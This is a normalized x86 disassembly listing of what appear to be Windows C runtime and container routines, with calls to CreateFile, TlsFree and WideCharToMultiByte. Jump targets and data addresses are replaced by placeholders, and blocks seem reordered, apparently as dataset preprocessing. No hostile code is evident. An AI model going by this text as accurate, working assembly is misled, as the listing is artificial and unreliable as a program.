mov edi [ ebp + 0xc ]
push edi
call sub_4066cf
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
call sub_415340
add esp 0x10
pop edi
pop esi
pop ebp
retn 0x8
push eax
call sub_408b16
add esp 0x4
sub_40cf30
push ebp
mov ebp esp
push 0xffffffff
push sub_4161d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi edx
push esi
mov eax edi
call sub_40e920
mov ecx eax
mov [ ebp - 0x3c ] ecx
cmp ecx [ edi + 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x34 ] al
push esi
or eax 0xffffffff
xor ebx ebx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] 0xf
call sub_406100
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x34 ]
push edx
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_40a170
push eax
mov eax [ ebp - 0x3c ]
push eax
lea esi [ ebp - 0x38 ]
call sub_410160
cmp [ ebp - 0x20 ] 0x10
mov esi [ ebp - 0x38 ]
jb r-xdata
cmp [ ecx + 0x20 ] 0x10
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x38 ] edx
jb r-xdata
lea eax [ esi + 0x28 ]
jmp r-xdata
mov ecx [ ebp - 0x34 ]
push ecx
call sub_408b16
add esp 0x4
add ecx 0xc
mov ecx [ ecx + 0xc ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax edx
mov ebx [ esi + 0x10 ]
mov eax ebx
cmp ebx edx
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
sets al
test al al
je r-xdata
mov eax [ ebp - 0x38 ]
cmp ebx eax
jae r-xdata
call sub_4025a0
test eax eax
jne r-xdata
mov eax [ ebp - 0x3c ]
add eax 0x28
xor ecx ecx
cmp ebx eax
setne cl
mov eax ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
sub_40d03f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_40ab76
pop ecx
sub_40d060
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_40d0c0
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_40458d
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
push esi
call sub_40a640
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
mov eax esi
pop ebx
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
pop ebx
retn
mov eax [ esi ]
mov [ eax ] 0x0
mov eax esi
pop ebx
retn
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop ebx
retn
push edi
push ebx
push eax
call sub_415340
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
sub ebx eax
push esi
mov eax edi
mov ecx esi
call sub_406100
pop ebx
retn
mov eax [ esi ]
sub ebx eax
push esi
mov eax edi
mov ecx esi
call sub_406100
pop ebx
retn
sub_40d190
push esi
mov esi eax
mov eax [ rw-data ]
cmp esi eax
jae r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov edx [ rw-data ]
cmp edx esi
ja r-xdata
test eax eax
je r-xdata
call sub_408b30
mov eax [ rw-data ]
sub esi edx
sar esi 0x3
cmp eax [ rw-data ]
jne r-xdata
add eax 0x8
mov [ rw-data ] eax
pop esi
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
mov ecx eax
test eax eax
je r-xdata
call sub_408b30
mov eax [ rw-data ]
mov edx [ rw-data ]
mov eax edx
mov edx [ eax + esi * 8 ]
mov [ ecx ] edx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ rw-data ]
add eax 0x8
mov [ rw-data ] eax
pop esi
retn
sub_40d215
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_40eb07
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_40d252
push 0xc
push r--data
call sub_413ff0
call sub_40b4c5
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_413c51
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d288
mov eax [ ebp - 0x1c ]
call sub_414035
retn
sub_40d28e
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
lea edx [ ecx + 0xa ]
cmp ax dx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x30
cmp ax cx
jb r-xdata
add edx 0x30
jmp r-xdata
cmp ax dx
jb r-xdata
sub_40d42e
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_402a4b
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40d4b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4161b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov [ ebp - 0x18 ] ebx
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x31 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ edi + 0xc ]
push ecx
mov ecx ebx
call sub_40a170
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
mov esi eax
mov [ esi + 0x4 ] edx
mov al [ edi + 0x30 ]
mov [ esi + 0x30 ] al
cmp [ ecx + 0x31 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov edx [ edi ]
push esi
push edx
mov ecx ebx
call sub_40d4b0
mov [ esi ] eax
mov eax [ edi + 0x8 ]
push esi
push eax
mov ecx ebx
call sub_40d4b0
mov [ esi + 0x8 ] eax
mov [ ebp - 0x14 ] esi
sub_40d564
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_404c41
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_40f84f
mov [ eax ] esi
call sub_40c515
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_40f84f
mov [ eax ] esi
call sub_40c515
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_401400
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_40db78
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_41523c
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_40d625
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40d6bc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_407759
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
call sub_40c515
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_40f84f
mov [ eax ] 0x2a
call sub_40f84f
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_40f84f
push 0x22
pop esi
mov [ eax ] esi
call sub_40c515
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_413e10
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_413e10
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40d811
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40ab76
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40ab76
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40ab76
push [ esi + 0xc0 ]
call sub_40ab76
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_406d3e
push [ esi + 0xd4 ]
call sub_40ab76
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40ab76
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40ab76
pop ecx
push [ esi + 0xb0 ]
call sub_40ab76
push [ esi + 0xbc ]
call sub_40ab76
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40ab76
push [ esi + 0xbc ]
call sub_40ec70
pop ecx
pop ecx
push eax
call sub_40ab76
pop ecx
push eax
call sub_40ab76
push [ esi + 0xbc ]
call sub_4071aa
pop ecx
pop ecx
sub_40d960
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_408b16
add esp 0x4
push r--data
call sub_40458d
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_40db78
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_40f84f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_40c515
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_413e90
inc eax
push eax
push edi
push esi
call sub_4138f0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_40dc50
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test al 0x2
je r-xdata
mov cl al
and cl 0x1
movsx esi cl
neg esi
sbb esi esi
and esi 0xc0000000
add esi 0x80000000
mov esi 0xc0000000
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
shr eax 0x8
not eax
and eax 0x1
or eax 0x2
mov edi eax
mov ecx r--data
mov eax ebx
push 0x0
push 0x80
push edi
push 0x0
push 0x1
push esi
push ebx
call [ CreateFileA@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
mov esp ebp
pop ebp
retn
push 0x104
lea edx [ ebp - 0x20c ]
push edx
push eax
call [ GetModuleFileNameW@IAT ]
push 0x0
push 0x80
push edi
push 0x0
push 0x1
push esi
lea eax [ ebp - 0x20c ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x214 ]
mov [ ebp - 0x214 ] esi
mov [ ebp - 0x210 ] 0x0
call sub_40d190
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_40dd53
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_403316
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_40eb5e
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40d811
pop ecx
sub_40dda0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_407759
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40ddd8
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
